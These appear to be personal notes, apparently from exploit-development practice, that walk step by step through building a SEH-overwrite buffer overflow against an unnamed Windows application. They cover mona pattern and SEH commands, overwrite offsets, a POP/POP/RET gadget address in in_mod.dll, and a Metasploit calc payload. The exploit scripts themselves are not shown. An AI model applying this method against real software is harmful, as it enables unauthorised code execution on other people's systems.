1. Use immunity debugger to generate pattern of the length of the PoC (17000) [xpl-2.py]:
    - !mona pattern_create 17000
    - xpl: headers + ptrn

[*] Something goes wrong. It seems that pattern is converted to unicode at some 
point. Given that with 'A's it worked, we will try to use 'A's + smaller_pattern 
    - xpl: 'A'(16000) + ptrn(1000)
[*] sEIP is overwritten again with 'A', but nSEH and SEH Handler are overwritten with pattern.
This means that somehow the execution flow is redirected to the memory region with 'A's.
¡But we control nSEH and SEH Handler, so we don't need to research why!

2. Find pattern with which the NSEH value has been overwritten (position 756):
    - !mona findmsp

4. Find a POP/POP/RET instruction from a non ASLR/Rebased/SafeSEH module
    - !mona seh 
    - 0x12f02bc3 (pop ecx # pop ecx # ret  |  {PAGE_EXECUTE_READ} [in_mod.dll])

5. Overwrite nSEH with jmp 0x06 and SEH Handler with POP/POP/RET [xpl-3.py]
    - xpl: content + junk[16756] + nseh + sehhandler
    [*] There is no need to add padding to overflow stack because a read from a invalid 
        location is done. That will trigger SEH Handler
    - add breakpoint in SEH Handler to check it's executed
    [*] ¡PROBLEM! DLL is not loaded at startup! Use custom PyCommand:
    - !break_dll_load in_mod.dll 0x12f02bc3

6.  Place CC asm instruction to check if everything is working  [xpl-4.py]
    - xpl: content + junk[2312] + nseh + sehhandler + payload + 0xCCCCCCCC

7. Exchange the breakpoint instructions with your preferred payload [xpl-5.py]
    - msfpayload windows/exec cmd=calc N
